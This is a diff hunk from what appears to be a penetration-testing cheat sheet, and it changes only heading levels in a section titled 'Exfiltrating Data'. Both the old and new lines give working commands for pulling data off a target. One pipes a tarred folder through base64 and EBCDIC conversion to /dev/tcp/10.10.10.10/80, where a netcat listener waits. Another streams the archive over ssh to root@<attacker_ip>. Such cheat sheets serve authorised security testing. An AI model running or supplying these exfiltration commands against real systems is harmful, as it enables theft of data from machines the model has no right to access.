@@ -78,27 +78,27 @@ reset
 screen
 ```
 
-# Exfiltrating Data
-## via TCP socket, ebcdic and base64
-### On kali:
+## Exfiltrating Data
+### via TCP socket, ebcdic and base64
+On kali:
 ```
 nc -nlvp 80 > datafolder.tmp
 ```
-### On target:
+On target:
 ```
 tar zcf - /tmp/datafolder | base64 | dd conv=ebcdic > /dev/tcp/10.10.10.10/80
 ```
-### On kali:
+On kali:
 ```
 dd conv=ascii if=datafolder.tmp | base64 -d > datafolder.tar
 tar xf datafolder.tar
 ```
-## via SSH
-### On target:
+### via SSH
+On target:
 ```
 tar zcf - /tmp/datafolder | ssh root@<attacker_ip> "cd /tmp; tar zxpf -"
 ```
-### On kali:
+On kali:
 ```
 cd /tmp/datafolder
 ```
